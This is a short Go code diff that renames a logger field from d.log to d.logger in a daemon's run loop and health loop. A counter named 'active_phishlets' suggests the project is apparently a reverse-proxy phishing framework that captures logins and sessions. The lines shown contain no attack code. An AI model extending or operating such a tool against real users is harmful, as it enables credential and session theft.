@@ -32,13 +32,13 @@ func (d *Daemon) Run(ctx context.Context) {
 			return
 		case err := <-proxyErr:
 			if err != nil {
-				d.log.Error("proxy error", "error", err)
+				d.logger.Error("proxy error", "error", err)
 			}
 			return
 		case <-sighup:
-			d.log.Info("SIGHUP received — reloading config")
+			d.logger.Info("SIGHUP received — reloading config")
 			if err := d.Reload(); err != nil {
-				d.log.Error("config reload failed", "error", err)
+				d.logger.Error("config reload failed", "error", err)
 			}
 		}
 	}
@@ -60,7 +60,7 @@ func (d *Daemon) healthLoop(ctx context.Context) {
 					activePhishlets++
 				}
 			}
-			d.log.Debug("health",
+			d.logger.Debug("health",
 				"goroutines", runtime.NumGoroutine(),
 				"active_phishlets", activePhishlets,
 				"open_sessions", openSessions,
